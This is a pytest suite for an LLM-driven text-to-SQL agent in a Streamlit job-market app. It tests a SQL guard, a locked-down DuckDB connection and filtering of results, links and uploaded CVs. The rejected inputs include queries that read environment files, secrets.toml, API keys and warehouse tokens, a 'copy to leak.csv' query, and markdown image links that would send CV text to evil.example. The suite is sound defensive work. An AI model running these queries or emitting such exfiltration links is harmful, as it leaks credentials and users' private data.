"""What a visitor must not be able to reach, however the question is phrased.

The text-to-SQL agent runs SQL an LLM wrote from a stranger's input, on a
connection that can see more than the marts. These tests pin the three layers
that keep it there: the guard, the locked-down connection, and the check on
what comes back.
"""

from __future__ import annotations

import io

import duckdb
import pandas as pd
import pytest
from streamlit_app import db, ui
from streamlit_app.agent import enforce_limit, is_safe_select
from streamlit_app.cv_match import CVUnreadable, match_share, read_cv
from streamlit_app.limits import CallBudget

from jmi_enrichment.providers import redact


# --- layer 1: the guard ------------------------------------------------------
@pytest.mark.parametrize(
    "sql",
    [
        # Every one of these is a single read-only SELECT, which is all the
        # keyword blocklist this replaced ever checked.
        "select content from read_text('/proc/self/environ')",
        "select * from read_csv('/app/.streamlit/secrets.toml')",
        "select * from 'https://example.com/x.csv'",
        "select * from glob('/home/*')",
        "select current_setting('motherduck_token')",
        "select CURRENT_SETTING('motherduck_token') from marts.DT_DATE",
        "select (select current_setting('motherduck_token')) from marts.DT_DATE",
        "select system.main.current_setting('motherduck_token')",
        "select getenv('GEMINI_API_KEY')",
        "select * from duckdb_settings()",
        "select * from duckdb_secrets()",
        "select * from query('select 1')",
        "select * from (show tables)",
        # Real data, but not the published tables.
        "select * from raw.raw_job_postings",
        "select * from staging.stg_job_postings",
        "select * from meta.pipeline_run",
        "select * from information_schema.tables",
        "select * from other_db.marts.DT_DATE",
        "with p as (select * from raw.raw_job_enrichment) select * from p",
        "select a from marts.DT_DATE where a in (select b from read_csv('x'))",
        # Unbounded work.
        "select count(*) from range(10000000000) a, range(10000000000) b",
    ],
)
def test_guard_rejects_reads_outside_the_marts(sql):
    ok, reason = is_safe_select(sql)
    assert not ok, f"guard let through: {sql}"
    assert reason


@pytest.mark.parametrize(
    "sql",
    [
        "select t, count(*) as n from marts.FT_JOB_POSTING, unnest(technologies) as u(t) "
        "group by t order by n desc limit 20",
        "select unnest(technologies) as tech from marts.ft_job_posting",
        "with es as (select * from marts.FT_JOB_POSTING where country_code = 'ES') "
        "select company_name, count(*) from es group by 1",
        "select date_trunc('week', date_key) as wk, count(*) "
        "from marts.FT_JOB_SNAPSHOT_DAILY group by 1",
        "select c.company_name from marts.DT_COMPANY c "
        "join marts.FT_JOB_POSTING p using (company_name)",
        # Words the old blocklist tripped on, where they are only text.
        "select title from marts.FT_JOB_POSTING where title ilike '%data; load & update%'",
        'select count(*) as "set" from marts.FT_JOB_POSTING',
    ],
)
def test_guard_still_accepts_what_the_agent_actually_writes(sql):
    ok, reason = is_safe_select(sql)
    assert ok, reason


def test_limit_is_enforced_on_the_outer_query_not_the_first_one_found():
    inner_only = "select * from (select title from marts.FT_JOB_POSTING limit 5) t"
    assert enforce_limit(inner_only).endswith("LIMIT 200")
    capped = enforce_limit("select 1 limit 100000")
    assert capped.endswith("LIMIT 500") and "100000" in capped
    assert enforce_limit("select 1 limit 40%").endswith("LIMIT 500")
    duckdb.sql(capped)  # the wrapped form is still valid SQL


# --- layer 2: the connection -------------------------------------------------
@pytest.fixture
def demo_conn():
    return db._demo_connection.__wrapped__()


@pytest.mark.parametrize(
    "sql",
    [
        "select content from read_text('/etc/hostname')",
        "select * from read_csv('pyproject.toml')",
        "select * from 'https://example.com/x.csv'",
        "copy (select 1) to 'leak.csv'",
        "attach 'other.duckdb'",
        "set enable_external_access = true",
    ],
)
def test_the_connection_refuses_files_and_network_without_the_guard(demo_conn, sql):
    # Deliberately not routed through is_safe_select: this is what holds when
    # the guard is wrong.
    with pytest.raises(duckdb.Error):
        demo_conn.cursor().execute(sql).fetchall()


def test_the_lock_down_still_serves_the_marts(demo_conn):
    assert demo_conn.cursor().execute("select count(*) from marts.FT_JOB_POSTING").fetchone()[0] > 0


# --- layer 3: what comes back ------------------------------------------------
def test_untrusted_query_is_interrupted(monkeypatch, demo_conn):
    monkeypatch.setattr(db, "_connection", lambda: demo_conn)
    with pytest.raises(db.QueryRefused, match="stopped"):
        db.run_untrusted(
            "select count(*) from marts.FT_JOB_SNAPSHOT_DAILY a, marts.FT_JOB_SNAPSHOT_DAILY b, "
            "marts.FT_JOB_SNAPSHOT_DAILY c, marts.FT_JOB_SNAPSHOT_DAILY d",
            timeout_s=0.2,
        )


def test_untrusted_result_carrying_a_credential_is_withheld(monkeypatch, demo_conn):
    token = "tok-0123456789-not-a-real-one"
    monkeypatch.setattr(db, "_connection", lambda: demo_conn)
    monkeypatch.setattr(db, "_secrets", lambda: [token])
    with pytest.raises(db.QueryRefused):
        db.run_untrusted(f"select 'prefix {token} suffix' as leaked")
    assert len(db.run_untrusted("select 1 as fine")) == 1


def test_driver_errors_are_scrubbed_of_the_warehouse_token():
    message = "IO Error: could not connect to md:jmi?motherduck_token=eyJhbGci.payload.sig"
    assert "eyJhbGci" not in redact(message)


# --- the LLM budget ----------------------------------------------------------
def test_call_budget_is_a_rolling_window():
    now = [0.0]
    budget = CallBudget(2, window_s=100, clock=lambda: now[0])
    assert budget.try_spend() and budget.try_spend()
    assert not budget.try_spend()
    assert budget.remaining() == 0
    now[0] = 101.0
    assert budget.remaining() == 2
    assert budget.try_spend()


def test_a_zero_budget_switches_the_llm_features_off():
    assert not CallBudget(0).try_spend()


# --- text and links nobody here wrote ----------------------------------------
def test_scraped_text_cannot_become_markdown():
    hostile = "Data Engineer [sign in](https://evil.example) ![x](https://evil.example/p.png)"
    inert = ui.md_text(hostile)
    assert "](" not in inert.replace("\\]\\(", "")
    assert inert.startswith("Data Engineer")


def test_llm_answers_lose_their_images_and_keep_their_text():
    answer = "**Match** 70%\n\n![cv](https://evil.example/?q=secret-cv-text)\n- gap"
    cleaned = ui.strip_md_images(answer)
    assert "evil.example" not in cleaned
    assert "**Match** 70%" in cleaned and "- gap" in cleaned


@pytest.mark.parametrize(
    ("url", "kept"),
    [
        ("https://boards.greenhouse.io/x/jobs/1", True),
        ("http://example.com/a?b=c", True),
        ("javascript:alert(1)", False),
        ("data:text/html,<script>1</script>", False),
        ("/relative/path", False),
        ("https://a.example/ b", False),
        (None, False),
        (pd.NA, False),
    ],
)
def test_only_web_links_are_offered(url, kept):
    assert (ui.safe_url(url) is not None) is kept


# --- CV uploads --------------------------------------------------------------
def test_a_broken_pdf_is_a_message_not_a_traceback():
    with pytest.raises(CVUnreadable):
        read_cv("cv.pdf", b"%PDF-1.7 this is not a pdf at all")


def test_a_pdf_without_text_says_so():
    from pypdf import PdfWriter

    writer = PdfWriter()
    writer.add_blank_page(width=200, height=200)
    buffer = io.BytesIO()
    writer.write(buffer)
    with pytest.raises(CVUnreadable, match="no text"):
        read_cv("scan.pdf", buffer.getvalue())


def test_text_uploads_are_read_and_bounded():
    from streamlit_app.cv_match import MAX_CV_CHARS

    assert read_cv("cv.txt", b"python, dbt") == "python, dbt"
    assert len(read_cv("cv.md", b"x" * (MAX_CV_CHARS + 10))) == MAX_CV_CHARS


def test_match_share_agrees_with_the_ranking():
    assert match_share(["python", "dbt", "analytics"], ["Python"]) == pytest.approx(1 / 3)
    assert match_share(["analytics"], ["python"]) is None
    assert match_share(None, ["python"]) is None
    assert match_share(pd.NA, ["python"]) is None
